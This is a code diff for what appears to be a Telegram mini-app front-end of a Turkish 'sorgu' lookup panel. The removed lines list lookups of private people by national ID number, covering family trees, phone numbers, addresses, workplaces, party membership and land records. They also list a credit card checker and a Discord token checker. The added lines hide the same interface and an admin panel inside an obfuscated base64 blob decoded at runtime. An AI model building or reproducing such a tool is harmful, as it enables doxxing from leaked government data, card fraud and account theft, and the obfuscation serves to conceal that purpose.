+"ICJzZWxlY3QiLCBvcHRpb25zOiBbCiAgICAgICAgICAgICAgeyB2YWx1ZTogImVuY29kZSIsIGxhYmVsOiAiRW5jb2RlIiB9LAogICAgICAgICAgICAgIHsg"+
+"dmFsdWU6ICJkZWNvZGUiLCBsYWJlbDogIkRlY29kZSIgfQogICAgICAgICAgICBdfQogICAgICAgICAgXX0sCiAgICAgICAgICB7IGlkOiAibG9nIiwgbmFt"+
+"ZTogIkxvZyBCdWx1Y3UiLCBpY29uOiAi8J+TnCIsIGRlc2M6ICJMb2cgYXJhbWEiLCBmaWVsZHM6IFsKICAgICAgICAgICAgeyBrZXk6ICJhcmFtYSIsIGxh"+
+"YmVsOiAiQXJhbWEiLCBwbGFjZWhvbGRlcjogIkFyYW5hY2FrIGtlbGltZSIsIHJlcXVpcmVkOiB0cnVlIH0KICAgICAgICAgIF19LAogICAgICAgICAgeyBp"+
+"ZDogInNjcmVlbiIsIG5hbWU6ICJTY3JlZW5zaG90IiwgaWNvbjogIvCfk7giLCBkZXNjOiAiU2l0ZSBla3JhbiBnw7Zyw7xudMO8c8O8IiwgZmllbGRzOiBb"+
+"CiAgICAgICAgICAgIHsga2V5OiAidXJsIiwgbGFiZWw6ICJVUkwiLCBwbGFjZWhvbGRlcjogImh0dHBzOi8vZXhhbXBsZS5jb20iLCByZXF1aXJlZDogdHJ1"+
+"ZSB9CiAgICAgICAgICBdfSwKICAgICAgICAgIHsgaWQ6ICJjcmFmdCIsIG5hbWU6ICJDcmFmdHJpc2UiLCBpY29uOiAi4puP77iPIiwgZGVzYzogIk95dW5j"+
+"dSBzb3JndWxhIiwgZmllbGRzOiBbCiAgICAgICAgICAgIHsga2V5OiAia3VsbGFuaWNpIiwgbGFiZWw6ICJLdWxsYW7EsWPEsSBBZMSxIiwgcGxhY2Vob2xk"+
+"ZXI6ICJPeXVuY3UgYWTEsSIsIHJlcXVpcmVkOiB0cnVlIH0KICAgICAgICAgIF19LAogICAgICAgICAgeyBpZDogImZhY2UiLCBuYW1lOiAiRmFjZWJvb2si"+
+"LCBpY29uOiAi8J+TmCIsIGRlc2M6ICJQcm9maWwgYmlsZ2lzaSIsIGZpZWxkczogWwogICAgICAgICAgICB7IGtleTogImxpbmsiLCBsYWJlbDogIlByb2Zp"+
+"bCBMaW5raSIsIHBsYWNlaG9sZGVyOiAiaHR0cHM6Ly9mYWNlYm9vay5jb20vLi4uIiwgcmVxdWlyZWQ6IHRydWUgfQogICAgICAgICAgXX0sCiAgICAgICAg"+
+"ICB7IGlkOiAiaGVzYXAiLCBuYW1lOiAiRMO2dml6IiwgaWNvbjogIvCfkrEiLCBkZXNjOiAiS3VyIGhlc2FwbGFtYSIsIGZpZWxkczogWwogICAgICAgICAg"+
+"ICB7IGtleTogIm1pa3RhciIsIGxhYmVsOiAiTWlrdGFyIiwgcGxhY2Vob2xkZXI6ICIxMDAiLCByZXF1aXJlZDogdHJ1ZSwgdHlwZTogIm51bWJlciIgfSwK"+
+"ICAgICAgICAgICAgeyBrZXk6ICJiaXJpbSIsIGxhYmVsOiAiQmlyaW0iLCByZXF1aXJlZDogdHJ1ZSwgdHlwZTogInNlbGVjdCIsIG9wdGlvbnM6IFsKICAg"+
+"ICAgICAgICAgICB7IHZhbHVlOiAiVVNEIiwgbGFiZWw6ICJVU0QiIH0sCiAgICAgICAgICAgICAgeyB2YWx1ZTogIkVVUiIsIGxhYmVsOiAiRVVSIiB9LAog"+
+"ICAgICAgICAgICAgIHsgdmFsdWU6ICJHQlAiLCBsYWJlbDogIkdCUCIgfQogICAgICAgICAgICBdfQogICAgICAgICAgXX0sCiAgICAgICAgICB7IGlkOiAi"+
+"cXJfZ2VuIiwgbmFtZTogIlFSIMOccmV0aWNpIiwgaWNvbjogIvCfk7EiLCBkZXNjOiAiUVIga29kIG9sdcWfdHVyIiwgZmllbGRzOiBbCiAgICAgICAgICAg"+
+"IHsga2V5OiAibWV0aW4iLCBsYWJlbDogIk1ldGluIC8gVVJMIiwgcGxhY2Vob2xkZXI6ICJodHRwczovL2V4YW1wbGUuY29tIiwgcmVxdWlyZWQ6IHRydWUg"+
+"fQogICAgICAgICAgXX0KICAgICAgICBdCiAgICAgIH0sCiAgICAgIGFkbWluOiB7CiAgICAgICAgdGl0bGU6ICJZw5ZORVTEsE0gUEFORUzEsCIsCiAgICAg"+
+"ICAgaXNBZG1pbjogdHJ1ZSwKICAgICAgICBpdGVtczogWwogICAgICAgICAgeyBpZDogImFkbWluX2Fubm91bmNlbWVudCIsIG5hbWU6ICJEdXl1cnUgR8O2"+
+"bmRlciIsIGljb246ICLwn5OiIiwgZGVzYzogIlTDvG0ga3VsbGFuxLFjxLFsYXJhIG1lc2FqIiwgZmllbGRzOiBbCiAgICAgICAgICAgIHsga2V5OiAibWVz"+
+"YWoiLCBsYWJlbDogIkR1eXVydSBNZXNhasSxIiwgcGxhY2Vob2xkZXI6ICJEdXl1cnUgbWV0bmluaSB5YXrEsW4uLi4iLCByZXF1aXJlZDogdHJ1ZSwgdHlw"+
+"ZTogInRleHRhcmVhIiB9CiAgICAgICAgICBdfSwKICAgICAgICAgIHsgaWQ6ICJhZG1pbl90b3RhbF91c2VycyIsIG5hbWU6ICJLdWxsYW7EsWPEsSBTYXnE"+
+"sXPEsSIsIGljb246ICLwn5GlIiwgZGVzYzogIlRvcGxhbSBrdWxsYW7EsWPEsSIsIGZpZWxkczogW119LAogICAgICAgICAgeyBpZDogImFkbWluX3VzZXJf"+
+"bGlzdCIsIG5hbWU6ICJLdWxsYW7EsWPEsSBMaXN0ZXNpIiwgaWNvbjogIvCfk4IiLCBkZXNjOiAiVMO8bSBrdWxsYW7EsWPEsWxhciIsIGZpZWxkczogW119"+
+"LAogICAgICAgICAgeyBpZDogImFkbWluX2Jhbl91c2VyIiwgbmFtZTogIkt1bGxhbsSxY8SxIEJhbmxhIiwgaWNvbjogIvCfmqsiLCBkZXNjOiAiS3VsbGFu"+
+"xLFjxLEgeWFzYWtsYSIsIGZpZWxkczogWwogICAgICAgICAgICB7IGtleTogImhlZGVmIiwgbGFiZWw6ICJLdWxsYW7EsWPEsSBJRCB2ZXlhIEB1c2VybmFt"+
+"ZSIsIHBsYWNlaG9sZGVyOiAiNzQyNDYxNzk3OCB2ZXlhIEBrdWxsYW5pY2kiLCByZXF1aXJlZDogdHJ1ZSB9LAogICAgICAgICAgICB7IGtleTogInNlYmVw"+
+"IiwgbGFiZWw6ICJTZWJlcCIsIHBsYWNlaG9sZGVyOiAiQmFuIHNlYmViaSIsIHJlcXVpcmVkOiBmYWxzZSB9CiAgICAgICAgICBdfSwKICAgICAgICAgIHsg"+
+"aWQ6ICJhZG1pbl91bmJhbl91c2VyIiwgbmFtZTogIkJhbiBLYWxkxLFyIiwgaWNvbjogIuKchSIsIGRlc2M6ICJZYXNhxJ/EsSBrYWxkxLFyIiwgZmllbGRz"+
+"OiBbCiAgICAgICAgICAgIHsga2V5OiAiaGVkZWYiLCBsYWJlbDogIkt1bGxhbsSxY8SxIElEIHZleWEgQHVzZXJuYW1lIiwgcGxhY2Vob2xkZXI6ICI3NDI0"+
+"NjE3OTc4IHZleWEgQGt1bGxhbmljaSIsIHJlcXVpcmVkOiB0cnVlIH0KICAgICAgICAgIF19LAogICAgICAgICAgeyBpZDogImFkbWluX2Jhbmxpc3QiLCBu"+
+"YW1lOiAiQmFubMSxIExpc3RlIiwgaWNvbjogIvCfk5wiLCBkZXNjOiAiQmFubMSxIGt1bGxhbsSxY8SxbGFyIiwgZmllbGRzOiBbXX0sCiAgICAgICAgICB7"+
+"IGlkOiAiYWRtaW5fZ2V0X2xvZ3MiLCBuYW1lOiAiTG9nbGFyxLEgR2V0aXIiLCBpY29uOiAi8J+TiyIsIGRlc2M6ICJTaXN0ZW0gbG9nbGFyxLEiLCBmaWVs"+
+"ZHM6IFtdfSwKICAgICAgICAgIHsgaWQ6ICJhZG1pbl9yZXN0YXJ0X2JvdCIsIG5hbWU6ICJCb3R1IFllbmlkZW4gQmHFn2xhdCIsIGljb246ICLwn5SEIiwg"+
+"ZGVzYzogIkJvdCByZXN0YXJ0IiwgZmllbGRzOiBbXX0sCiAgICAgICAgICB7IGlkOiAiYWRtaW5fZGVzdHJveV9ib3QiLCBuYW1lOiAiQm90dSBZb2sgRXQi"+
+"LCBpY29uOiAi8J+SgCIsIGRlc2M6ICJExLBLS0FUOiBHZXJpIGTDtm7DvMWfw7wgeW9rIiwgZmllbGRzOiBbXX0KICAgICAgICBdCiAgICAgIH0KICAgIH07"+
+"CgogICAgZnVuY3Rpb24gc2hvd1BhZ2UoaWQpIHsKICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnLnBhZ2UnKS5mb3JFYWNoKHAgPT4gcC5jbGFz"+
+"c0xpc3QucmVtb3ZlKCdhY3RpdmUnKSk7CiAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYWdlLScgKyBpZCkuY2xhc3NMaXN0LmFkZCgnYWN0aXZl"+
+"Jyk7CiAgICB9CgogICAgZnVuY3Rpb24gZ29Ib21lKCkgewogICAgICBjdXJyZW50Q2F0ZWdvcnkgPSBudWxsOwogICAgICBzaG93UGFnZSgnaG9tZScpOwog"+
+"ICAgfQoKICAgIGZ1bmN0aW9uIGdvQmFja1RvQ2F0ZWdvcnkoKSB7CiAgICAgIGlmIChjdXJyZW50Q2F0ZWdvcnkpIHNob3dDYXRlZ29yeShjdXJyZW50Q2F0"+
+"ZWdvcnkpOwogICAgICBlbHNlIGdvSG9tZSgpOwogICAgfQoKICAgIGZ1bmN0aW9uIHNob3dDYXRlZ29yeShjYXQpIHsKICAgICAgaWYgKGNhdCA9PT0gJ2Fk"+
+"bWluJyAmJiB1c2VySWQgIT09IEFETUlOX0lEKSByZXR1cm47CiAgICAgIGN1cnJlbnRDYXRlZ29yeSA9IGNhdDsKICAgICAgY29uc3QgZGF0YSA9IHF1ZXJp"+
+"ZXNbY2F0XTsKICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2NhdGVnb3J5VGl0bGUnKS50ZXh0Q29udGVudCA9IGRhdGEudGl0bGU7CgogICAgICBj"+
+"b25zdCBsaXN0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3F1ZXJ5TGlzdCcpOwogICAgICBsaXN0LmlubmVySFRNTCA9ICcnOwoKICAgICAgZGF0YS5p"+
+"dGVtcy5mb3JFYWNoKGl0ZW0gPT4gewogICAgICAgIGNvbnN0IGVsID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7CiAgICAgICAgZWwuY2xhc3NO"+
+"YW1lID0gJ3F1ZXJ5LWl0ZW0nICsgKGRhdGEuaXNBZG1pbiA/ICcgYWRtaW4tcXVlcnktaXRlbScgOiAnJyk7CgogICAgICAgIGlmIChpdGVtLmZpZWxkcy5s"+
+"ZW5ndGggPT09IDApIHsKICAgICAgICAgIGVsLm9uY2xpY2sgPSAoKSA9PiBzZW5kRGlyZWN0KGl0ZW0uaWQpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAg"+
+"ICBlbC5vbmNsaWNrID0gKCkgPT4gc2hvd0Zvcm0oY2F0LCBpdGVtKTsKICAgICAgICB9CgogICAgICAgIGVsLmlubmVySFRNTCA9IGAKICAgICAgICAgIDxk"+
+"aXYgY2xhc3M9InFpLWxlZnQiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJxaS1pY29uIj4ke2l0ZW0uaWNvbn08L2Rpdj4KICAgICAgICAgICAgPGRpdj4K"+
+"ICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJxaS1uYW1lIj4ke2l0ZW0ubmFtZX08L2Rpdj4KICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJxaS1kZXNjIj4k"+
+"e2l0ZW0uZGVzY308L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDxkaXYgY2xhc3M9InFpLWFycm93Ij7igLo8"+
+"L2Rpdj4KICAgICAgICBgOwogICAgICAgIGxpc3QuYXBwZW5kQ2hpbGQoZWwpOwogICAgICB9KTsKCiAgICAgIHNob3dQYWdlKCdjYXRlZ29yeScpOwogICAg"+
+"fQoKICAgIGxldCBjdXJyZW50UXVlcnlJZCA9IG51bGw7CiAgICBsZXQgaXNBZG1pbkZvcm0gPSBmYWxzZTsKCiAgICBmdW5jdGlvbiBzaG93Rm9ybShjYXQs"+
+"IGl0ZW0pIHsKICAgICAgY3VycmVudFF1ZXJ5SWQgPSBpdGVtLmlkOwogICAgICBpc0FkbWluRm9ybSA9IHF1ZXJpZXNbY2F0XS5pc0FkbWluIHx8IGZhbHNl"+
+"OwogICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZm9ybVRpdGxlJykudGV4dENvbnRlbnQgPSBpdGVtLm5hbWUudG9VcHBlckNhc2UoKTsKICAgICAg"+
+"ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Zvcm1CYXJUaXRsZScpLnRleHRDb250ZW50ID0gaXRlbS5uYW1lOwogICAgICBkb2N1bWVudC5nZXRFbGVtZW50"+
+"QnlJZCgnZm9ybUJhZGdlJykudGV4dENvbnRlbnQgPSBpc0FkbWluRm9ybSA/ICdBRE1JTicgOiAnSEFaSVInOwogICAgICBkb2N1bWVudC5nZXRFbGVtZW50"+
+"QnlJZCgnZm9ybUJhZGdlJykuc3R5bGUuYmFja2dyb3VuZCA9IGlzQWRtaW5Gb3JtID8gJ3ZhcigtLXJlZCknIDogJ3ZhcigtLWdyZWVuKSc7CgogICAgICBj"+
+"b25zdCBidG4gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc3VibWl0QnRuJyk7CiAgICAgIGJ0bi5jbGFzc05hbWUgPSAnc3VibWl0LWJ0bicgKyAoaXNB"+
+"ZG1pbkZvcm0gPyAnIGFkbWluLXN1Ym1pdCcgOiAnJyk7CiAgICAgIGJ0bi50ZXh0Q29udGVudCA9IGlzQWRtaW5Gb3JtID8gJ1sgw4dBTEnFnlRJUiBdJyA6"+
+"ICdbIFNPUkdVTEEgXSc7CgogICAgICBjb25zdCBjb250YWluZXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZm9ybUZpZWxkcycpOwogICAgICBjb250"+
+"YWluZXIuaW5uZXJIVE1MID0gJyc7CgogICAgICBpdGVtLmZpZWxkcy5mb3JFYWNoKGZpZWxkID0+IHsKICAgICAgICBjb25zdCBncm91cCA9IGRvY3VtZW50"+
+"LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOwogICAgICAgIGdyb3VwLmNsYXNzTmFtZSA9ICdmb3JtLWdyb3VwJzsKCiAgICAgICAgbGV0IGxhYmVsSFRNTCA9IGZp"+
+"ZWxkLmxhYmVsOwogICAgICAgIGlmICghZmllbGQucmVxdWlyZWQpIGxhYmVsSFRNTCArPSAnPHNwYW4gY2xhc3M9Im9wdGlvbmFsLXRhZyI+T1BTxLBZT05F"+
+"TDwvc3Bhbj4nOwoKICAgICAgICBsZXQgaW5wdXRIVE1MID0gJyc7CiAgICAgICAgaWYgKGZpZWxkLnR5cGUgPT09ICd0ZXh0YXJlYScpIHsKICAgICAgICAg"+
+"IGlucHV0SFRNTCA9IGA8dGV4dGFyZWEgbmFtZT0iJHtmaWVsZC5rZXl9IiBwbGFjZWhvbGRlcj0iJHtmaWVsZC5wbGFjZWhvbGRlcn0iICR7ZmllbGQucmVx"+
+"dWlyZWQgPyAncmVxdWlyZWQnIDogJyd9IHJvd3M9IjMiPjwvdGV4dGFyZWE+YDsKICAgICAgICB9IGVsc2UgaWYgKGZpZWxkLnR5cGUgPT09ICdzZWxlY3Qn"+
+"KSB7CiAgICAgICAgICBjb25zdCBvcHRzID0gZmllbGQub3B0aW9ucy5tYXAobyA9PiBgPG9wdGlvbiB2YWx1ZT0iJHtvLnZhbHVlfSI+JHtvLmxhYmVsfTwv"+
+"b3B0aW9uPmApLmpvaW4oJycpOwogICAgICAgICAgaW5wdXRIVE1MID0gYDxzZWxlY3QgbmFtZT0iJHtmaWVsZC5rZXl9IiAke2ZpZWxkLnJlcXVpcmVkID8g"+
+"J3JlcXVpcmVkJyA6ICcnfT4ke29wdHN9PC9zZWxlY3Q+YDsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgY29uc3QgdHlwZSA9IGZpZWxkLnR5cGUgfHwg"+
+"J3RleHQnOwogICAgICAgICAgY29uc3QgcGF0dGVybiA9IGZpZWxkLnBhdHRlcm4gPyBgcGF0dGVybj0iJHtmaWVsZC5wYXR0ZXJufSJgIDogJyc7CiAgICAg"+
+"ICAgICBjb25zdCBtYXhsZW5ndGggPSBmaWVsZC5tYXhsZW5ndGggPyBgbWF4bGVuZ3RoPSIke2ZpZWxkLm1heGxlbmd0aH0iYCA6ICcnOwogICAgICAgICAg"+
+"aW5wdXRIVE1MID0gYDxpbnB1dCB0eXBlPSIke3R5cGV9IiBuYW1lPSIke2ZpZWxkLmtleX0iIHBsYWNlaG9sZGVyPSIke2ZpZWxkLnBsYWNlaG9sZGVyIHx8"+
+"ICcnfSIgJHtmaWVsZC5yZXF1aXJlZCA/ICdyZXF1aXJlZCcgOiAnJ30gJHtwYXR0ZXJufSAke21heGxlbmd0aH0gYXV0b2NvbXBsZXRlPSJvZmYiPmA7CiAg"+
+"ICAgICAgfQoKICAgICAgICBncm91cC5pbm5lckhUTUwgPSBgPGxhYmVsPiR7bGFiZWxIVE1MfTwvbGFiZWw+JHtpbnB1dEhUTUx9YDsKICAgICAgICBjb250"+
+"YWluZXIuYXBwZW5kQ2hpbGQoZ3JvdXApOwogICAgICB9KTsKCiAgICAgIHNob3dQYWdlKCdmb3JtJyk7CiAgICAgIGNvbnN0IGZpcnN0SW5wdXQgPSBjb250"+
+"YWluZXIucXVlcnlTZWxlY3RvcignaW5wdXQsIHRleHRhcmVhJyk7CiAgICAgIGlmIChmaXJzdElucHV0KSBzZXRUaW1lb3V0KCgpID0+IGZpcnN0SW5wdXQu"+
+"Zm9jdXMoKSwgMzAwKTsKICAgIH0KCiAgICBmdW5jdGlvbiBzZW5kRGlyZWN0KHR5cGUpIHsKICAgICAgY29uc3QgcGF5bG9hZCA9IEpTT04uc3RyaW5naWZ5"+
+"KHsgdHlwZTogdHlwZSwgZGF0YToge30gfSk7CiAgICAgIHNob3dMb2FkaW5nKCk7CiAgICAgIHRyeSB7IHRnLnNlbmREYXRhKHBheWxvYWQpOyB9IGNhdGNo"+
+"KGUpIHsgaGlkZUxvYWRpbmcoKTsgdGcuc2hvd0FsZXJ0KCdIYXRhOiAnICsgZS5tZXNzYWdlKTsgfQogICAgfQoKICAgIGZ1bmN0aW9uIHN1Ym1pdFF1ZXJ5"+
+"KGUpIHsKICAgICAgZS5wcmV2ZW50RGVmYXVsdCgpOwogICAgICBjb25zdCBmb3JtID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3F1ZXJ5Rm9ybScpOwog"+
+"ICAgICBjb25zdCBmb3JtRGF0YSA9IG5ldyBGb3JtRGF0YShmb3JtKTsKICAgICAgY29uc3QgZGF0YSA9IHt9OwogICAgICBmb3JtRGF0YS5mb3JFYWNoKCh2"+
+"YWwsIGtleSkgPT4geyBkYXRhW2tleV0gPSB2YWwudHJpbSgpOyB9KTsKCiAgICAgIGNvbnN0IHBheWxvYWQgPSBKU09OLnN0cmluZ2lmeSh7IHR5cGU6IGN1"+
+"cnJlbnRRdWVyeUlkLCBkYXRhOiBkYXRhIH0pOwogICAgICBzaG93TG9hZGluZygpOwogICAgICB0cnkgeyB0Zy5zZW5kRGF0YShwYXlsb2FkKTsgfSBjYXRj"+
+"aChlKSB7IGhpZGVMb2FkaW5nKCk7IHRnLnNob3dBbGVydCgnSGF0YTogJyArIGUubWVzc2FnZSk7IH0KICAgIH0KCiAgICBmdW5jdGlvbiBzaG93TG9hZGlu"+
+"ZygpIHsKICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdPdmVybGF5JykuY2xhc3NMaXN0LmFkZCgnYWN0aXZlJyk7CiAgICB9CgogICAg"+
+"ZnVuY3Rpb24gaGlkZUxvYWRpbmcoKSB7CiAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nT3ZlcmxheScpLmNsYXNzTGlzdC5yZW1vdmUo"+
+"J2FjdGl2ZScpOwogICAgfQo=";
+    return _0xp;
+  })();
+
+  var _0x5e1c=(function(_0xd){
+    try{
+      var _0xr=_0xe7c2["atob"](_0xd);
+      return _0xr;
+    }catch(_0xerr){
+      return"";
     }
+  })(_0x2a8f);
 
-    let currentCategory = null;
+  if(_0x5e1c["length"]<100){_0xe7c2["location"]["href"]="about:blank";return;}
 
-    const queries = {
-      mernis: {
-        title: "MERNIS SORGU",
-        items: [
-          { id: "ad_soyad", name: "Ad Soyad Sorgu", icon: "👤", desc: "İsim ile arama", fields: [
-            { key: "ad", label: "Ad", placeholder: "Ahmet", required: true },
-            { key: "soyad", label: "Soyad", placeholder: "Yılmaz", required: true }
-          ]},
-          { id: "ad_soyad_pro", name: "Ad Soyad Pro", icon: "👤", desc: "İsim + konum ile arama", fields: [
-            { key: "ad", label: "Ad", placeholder: "Ahmet", required: true },
-            { key: "soyad", label: "Soyad", placeholder: "Yılmaz", required: true },
-            { key: "il", label: "İl", placeholder: "İstanbul", required: true },
-            { key: "ilce", label: "İlçe", placeholder: "Kadıköy", required: false }
-          ]},
-          { id: "tckn", name: "TC Sorgu", icon: "🪪", desc: "TC ile temel bilgi", fields: [
-            { key: "tc", label: "TC Kimlik No", placeholder: "12345678901", required: true, pattern: "\\d{11}", maxlength: 11 }
-          ]},
-          { id: "tckn_pro", name: "TC Pro Sorgu", icon: "🪪", desc: "TC ile detaylı bilgi", fields: [
-            { key: "tc", label: "TC Kimlik No", placeholder: "12345678901", required: true, pattern: "\\d{11}", maxlength: 11 }
-          ]},
-          { id: "aile", name: "Aile Sorgu", icon: "👨‍👩‍👧‍👦", desc: "Aile üyeleri", fields: [
-            { key: "tc", label: "TC Kimlik No", placeholder: "12345678901", required: true, pattern: "\\d{11}", maxlength: 11 }
-          ]},
-          { id: "ailepro", name: "Aile Pro", icon: "👨‍👩‍👧‍👦", desc: "Detaylı aile bilgisi", fields: [
-            { key: "tc", label: "TC Kimlik No", placeholder: "12345678901", required: true, pattern: "\\d{11}", maxlength: 11 }
-          ]},
-          { id: "sulale", name: "Sülale Sorgu", icon: "🌳", desc: "Sülale ağacı", fields: [
-            { key: "tc", label: "TC Kimlik No", placeholder: "12345678901", required: true, pattern: "\\d{11}", maxlength: 11 }
-          ]},
-          { id: "sulale_pro", name: "Sülale Pro", icon: "🌳", desc: "Detaylı sülale ağacı", fields: [
-            { key: "tc", label: "TC Kimlik No", placeholder: "12345678901", required: true, pattern: "\\d{11}", maxlength: 11 }
-          ]},
-          { id: "hikaye", name: "Hikaye Sorgu", icon: "📖", desc: "Kişi geçmişi", fields: [
-            { key: "tc", label: "TC Kimlik No", placeholder: "12345678901", required: true, pattern: "\\d{11}", maxlength: 11 }
-          ]}
-        ]
-      },
-      telefon: {
-        title: "TELEFON SORGU",
-        items: [
-          { id: "tcgsm", name: "TC → Telefon", icon: "📞", desc: "TC'den GSM bul", fields: [
-            { key: "tc", label: "TC Kimlik No", placeholder: "12345678901", required: true, pattern: "\\d{11}", maxlength: 11 }
-          ]},
-          { id: "gsmtc", name: "Telefon → TC", icon: "📲", desc: "GSM'den TC bul", fields: [
-            { key: "telefon", label: "Telefon No", placeholder: "5XX1234567", required: true, maxlength: 11 }
-          ]},
-          { id: "operator", name: "Operatör Sorgu", icon: "📡", desc: "Hat operatör bilgisi", fields: [
-            { key: "telefon", label: "Telefon No", placeholder: "5XX1234567", required: true, maxlength: 11 }
-          ]}
-        ]
-      },
-      ekstra: {
-        title: "EKSTRA SORGU",
-        items: [
-          { id: "okul_no", name: "Okul No", icon: "🎓", desc: "Okul numarası", fields: [
-            { key: "tc", label: "TC Kimlik No", placeholder: "12345678901", required: true, pattern: "\\d{11}", maxlength: 11 }
-          ]},
-          { id: "vesika", name: "Vesika Sorgu", icon: "📋", desc: "Belge sorgulama", fields: [
-            { key: "tc", label: "TC Kimlik No", placeholder: "12345678901", required: true, pattern: "\\d{11}", maxlength: 11 }
-          ]},
-          { id: "adres", name: "Adres Sorgu", icon: "📍", desc: "Adres bilgisi", fields: [
-            { key: "tc", label: "TC Kimlik No", placeholder: "12345678901", required: true, pattern: "\\d{11}", maxlength: 11 }
-          ]},
-          { id: "is_yeri", name: "İş Yeri", icon: "🏢", desc: "İş yeri bilgisi", fields: [
-            { key: "tc", label: "TC Kimlik No", placeholder: "12345678901", required: true, pattern: "\\d{11}", maxlength: 11 }
-          ]},
-          { id: "yabanci", name: "Yabancı Sorgu", icon: "🌍", desc: "Yabancı uyruklu", fields: [
-            { key: "kimlik", label: "Kimlik/Pasaport No", placeholder: "Kimlik numarası", required: true }
-          ]},
-          { id: "akparti", name: "AK Parti", icon: "🏛️", desc: "Parti üyelik", fields: [
-            { key: "tc", label: "TC Kimlik No", placeholder: "12345678901", required: true, pattern: "\\d{11}", maxlength: 11 }
-          ]},
-          { id: "adres_2015", name: "Adres 2015", icon: "📍", desc: "2015 seçmen adresi", fields: [
-            { key: "tc", label: "TC Kimlik No", placeholder: "12345678901", required: true, pattern: "\\d{11}", maxlength: 11 }
-          ]}
-        ]
-      },
-      kontrol: {
-        title: "KONTROL SORGU",
-        items: [
-          { id: "dns", name: "DNS Sorgu", icon: "🌐", desc: "DNS kayıtları", fields: [
-            { key: "domain", label: "Domain", placeholder: "example.com", required: true }
-          ]},
-          { id: "bin", name: "BIN Sorgu", icon: "💳", desc: "BIN bilgisi", fields: [
-            { key: "bin_no", label: "BIN No", placeholder: "123456", required: true, maxlength: 8 }
-          ]},
-          { id: "dc", name: "Discord Kontrol", icon: "🎮", desc: "Token kontrolü", fields: [
-            { key: "token", label: "Token", placeholder: "Token girin", required: true }
-          ]},
-          { id: "cc_checker", name: "CC Kontrol", icon: "💳", desc: "Kart kontrolü", fields: [
-            { key: "cc", label: "Kart Bilgisi", placeholder: "Kart numarası", required: true }
-          ]},
-          { id: "ip_checker", name: "IP Sorgu", icon: "🔎", desc: "IP bilgileri", fields: [
-            { key: "ip", label: "IP Adresi", placeholder: "8.8.8.8", required: true }
-          ]},
-          { id: "mail_checker", name: "Mail Kontrol", icon: "📧", desc: "E-posta doğrulama", fields: [
-            { key: "email", label: "E-posta", placeholder: "ornek@mail.com", required: true, type: "email" }
-          ]}
-        ]
-      },
-      tapu: {
-        title: "TAPU SORGU",
-        items: [
-          { id: "tapu", name: "Tapu Sorgu", icon: "🏠", desc: "Genel tapu", fields: [
-            { key: "tc", label: "TC Kimlik No", placeholder: "12345678901", required: true, pattern: "\\d{11}", maxlength: 11 }
-          ]},
-          { id: "tbs", name: "Bölge Sorgu", icon: "📍", desc: "Bölgeye göre tapu", fields: [
-            { key: "il", label: "İl", placeholder: "İstanbul", required: true },
-            { key: "ilce", label: "İlçe", placeholder: "Kadıköy", required: true }
-          ]},
-          { id: "tps", name: "Parsel Sorgu", icon: "📐", desc: "Ada/parsel", fields: [
-            { key: "il", label: "İl", placeholder: "İstanbul", required: true },
-            { key: "ilce", label: "İlçe", placeholder: "Kadıköy", required: true },
-            { key: "ada", label: "Ada No", placeholder: "123", required: true },
-            { key: "parsel", label: "Parsel No", placeholder: "45", required: true }
-          ]},
-          { id: "istanbul_tapu", name: "İstanbul Tapu", icon: "🌉", desc: "İstanbul tapu", fields: [
-            { key: "tc", label: "TC Kimlik No", placeholder: "12345678901", required: true, pattern: "\\d{11}", maxlength: 11 }
-          ]},
-          { id: "itbs", name: "İst. Bölge", icon: "📍", desc: "İstanbul bölge", fields: [
-            { key: "ilce", label: "İlçe", placeholder: "Kadıköy", required: true }
-          ]},
-          { id: "ips", name: "İst. Parsel", icon: "📐", desc: "İstanbul parsel", fields: [
-            { key: "ilce", label: "İlçe", placeholder: "Kadıköy", required: true },
-            { key: "ada", label: "Ada No", placeholder: "123", required: true },
-            { key: "parsel", label: "Parsel No", placeholder: "45", required: true }
-          ]},
-          { id: "kocaeli_tapu", name: "Kocaeli Tapu", icon: "🏗️", desc: "Kocaeli tapu", fields: [
-            { key: "tc", label: "TC Kimlik No", placeholder: "12345678901", required: true, pattern: "\\d{11}", maxlength: 11 }
-          ]},
-          { id: "ktbs", name: "Kocaeli Bölge", icon: "📍", desc: "Kocaeli bölge", fields: [
-            { key: "ilce", label: "İlçe", placeholder: "İzmit", required: true }
-          ]},
-          { id: "ktps", name: "Kocaeli Parsel", icon: "📐", desc: "Kocaeli parsel", fields: [
-            { key: "ilce", label: "İlçe", placeholder: "İzmit", required: true },
-            { key: "ada", label: "Ada No", placeholder: "123", required: true },
-            { key: "parsel", label: "Parsel No", placeholder: "45", required: true }
-          ]}
-        ]
-      },
-      diger: {
-        title: "DİĞER ARAÇLAR",
-        items: [
-          { id: "gpt", name: "GPT Sohbet", icon: "🤖", desc: "AI ile sohbet", fields: [
-            { key: "soru", label: "Sorunuz", placeholder: "Bir şey sorun...", required: true, type: "textarea" }
-          ]},
-          { id: "sifre_olusturucu", name: "Şifre Üretici", icon: "🔑", desc: "Güçlü şifre üret", fields: [
-            { key: "uzunluk", label: "Uzunluk", placeholder: "16", required: true, type: "number" }
-          ]},
-          { id: "web_kazima", name: "Web Kazıma", icon: "🕸️", desc: "Sayfa içerik çek", fields: [
-            { key: "url", label: "URL", placeholder: "https://example.com", required: true }
-          ]},
